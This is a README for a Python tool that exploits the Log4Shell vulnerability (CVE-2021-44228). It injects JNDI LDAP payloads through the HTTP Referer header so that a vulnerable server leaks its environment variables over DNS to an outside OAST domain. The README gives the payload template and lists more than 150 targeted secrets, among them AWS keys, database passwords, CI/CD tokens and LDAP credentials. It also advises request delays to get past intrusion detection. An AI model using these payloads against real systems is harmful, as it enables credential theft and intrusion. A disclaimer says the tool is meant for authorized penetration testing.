# Log4Shell DNS Exfiltration Tool

Automated environment variable and system property exfiltration tool exploiting Log4Shell (CVE-2021-44228) vulnerability via DNS-based JNDI LDAP injection.

## Overview

This tool systematically tests for Log4Shell vulnerability by injecting JNDI payloads that trigger DNS lookups containing sensitive environment variables and Java system properties. Exfiltrated data can be captured using OAST services like interact.sh or Burp Collaborator.

## Features

- Comprehensive secret enumeration across 14 categories
- 150+ predefined sensitive variables including:
  - Database credentials
  - Cloud provider keys (AWS, Azure, GCP)
  - CI/CD tokens
  - LDAP/Active Directory credentials
  - Email/SMTP credentials
  - Service tokens (GitHub, Slack, Docker, etc.)
  - YouTrack/JetBrains specific secrets
- Combined variable extraction for correlated data
- Configurable request delays to avoid detection
- Real-time status tracking

## Requirements
```bash
pip install requests urllib3
```

## Usage

### Basic Usage
```bash
python3 log4shell_exfil.py -t http://target.com/ -d abc123.interact.sh
```

### Advanced Usage
```bash
python3 log4shell_exfil.py \
  -t http://target.com/vulnerable-endpoint \
  -d abc123.oastify.com \
  --delay 1.0
```

### Parameters

- `-t, --target` (required): Target URL to test
- `-d, --domain` (required): OAST domain for DNS exfiltration
- `--delay`: Delay between requests in seconds (default: 0.5)

## How It Works

1. **Payload Generation**: Creates JNDI LDAP payloads with embedded variable lookups
```
   ${jndi:ldap://label.${env:SECRET_KEY}.oast-domain.com}
```

2. **Injection**: Sends payloads via HTTP Referer header to vulnerable Log4j instances

3. **DNS Exfiltration**: Vulnerable application performs DNS lookup, encoding the variable value in the subdomain

4. **Collection**: Monitor your OAST service dashboard to view exfiltrated data

## Exfiltration Phases

### Phase 1-13: Single Variable Extraction
- Database Credentials
- YouTrack & JetBrains Secrets
- LDAP/Active Directory
- Cloud Provider Credentials (AWS, Azure, GCP)
- Generic Secrets & API Keys
- Service Tokens
- Email/SMTP Credentials
- CI/CD Secrets
- Backup & Storage
- Network & Proxy Information
- System Information

### Phase 14: Combined Extractions
Extracts multiple related values in single DNS queries:
- `DB_USER` + `DB_PASSWORD`
- `COMPUTERNAME` + `USERNAME`
- `AWS_ACCESS_KEY_ID` + `AWS_SECRET_ACCESS_KEY`
- `USERDOMAIN` + `LOGONSERVER`
- `java.version` + `os.name`

### Burp Collaborator
1. Open Burp Suite Professional
2. Go to Burp > Burp Collaborator client
3. Click "Copy to clipboard"
4. Use the domain with this tool

## Interpreting Results

DNS queries will appear in your OAST service as:
```
label.VALUE.your-oast-domain.com
```
## Operational Security

- Use appropriate delays to avoid IDS/IPS detection
- Consider using multiple OAST domains for different phases
- Test only on systems you have explicit permission to assess
- Be aware that DNS queries may be logged by intermediate DNS servers

## Legal Disclaimer

This tool is provided for authorized security testing and educational purposes only. Unauthorized access to computer systems is illegal. Users are responsible for complying with all applicable laws and regulations.

## Technical Details

### Supported Variable Types
- Environment Variables: `${env:VARIABLE_NAME}`
- Java System Properties: `${sys:property.name}`

### Payload Delivery
- Header: `Referer`
- Method: GET request

### Error Handling
- SSL verification disabled for testing
- Connection timeouts set to 10 seconds
- Graceful handling of network failures

## Limitations

- DNS label length limits may truncate long values (63 chars per label)
- Some characters in values may be sanitized by DNS resolution
- Requires vulnerable Log4j version (2.0-beta9 to 2.14.1)
- Target must have network access to perform DNS lookups

## References

- CVE-2021-44228 (Log4Shell)
- [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)
- [JNDI Injection](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)

## Contributing

This tool is maintained for authorized penetration testing purposes. Improvements and additional variable categories are welcome via pull requests.

## License

Educational and authorized security testing use only.
